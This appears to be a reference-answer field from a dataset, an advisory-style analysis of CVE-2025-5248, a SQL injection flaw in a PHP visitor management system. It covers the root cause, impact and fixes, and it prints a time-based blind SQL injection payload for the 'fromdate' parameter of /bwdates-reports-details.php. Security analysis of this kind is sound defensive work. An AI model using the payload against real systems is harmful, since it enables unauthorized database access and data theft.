  "reference_content": "## Analysis of CVE-2025-5248 Content\n\nBased on the provided content, this relates to a SQL injection vulnerability in Phpgurukul Company Visitors Management System Project V1.0.\n\n**Root cause of vulnerability:**\n\nThe root cause is the lack of proper cleaning or validation of user input from the `MULTIPART fromdate` parameter before it's used in SQL queries. This allows attackers to inject malicious code.\n\n**Weaknesses/vulnerabilities present:**\n\n*   SQL Injection\n\n**Impact of exploitation:**\n\n*   Unauthorized database access\n*   Sensitive data leakage\n*   Data tampering\n*   System control\n*   Service interruption\n\n**Attack vectors:**\n\n*   The vulnerability is exploitable via the `/bwdates-reports-details.php` file.\n*   Specifically, the `MULTIPART fromdate` parameter is vulnerable.\n*   No login or authorization is required to exploit the vulnerability.\n\n**Required attacker capabilities/position:**\n\n*   An attacker needs to be able to send crafted HTTP POST requests to the vulnerable endpoint.\n*   No authentication is required.\n\n**Mitigation or fix:**\n\n*   Use prepared statements and parameter binding.\n*   Input validation and filtering.\n*   Minimize database user permissions.\n*   Regular security audits.\n\n**Payload Example:**\n\n```\n---\nParameter: MULTIPART fromdate ((custom) POST)\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: -----------------------------20686842243038726603535447181\nContent-Disposition: form-data; name=\"fromdate\"\n\n1111-11-11' AND (SELECT 1940 FROM (SELECT(SLEEP(5)))MWaw) AND 'cgUF'='cgUF\n-----------------------------20686842243038726603535447181\nContent-Disposition: form-data; name=\"todate\"\n\n0111-11-11\n-----------------------------20686842243038726603535447181\nContent-Disposition: form-data; name=\"submit\"\n\n-----------------------------20686842243038726603535447181--\n---\n```\n\n**Note:** This content provides more detail than a typical CVE description, including a proof-of-concept (POC) payload and suggested remediation steps.",
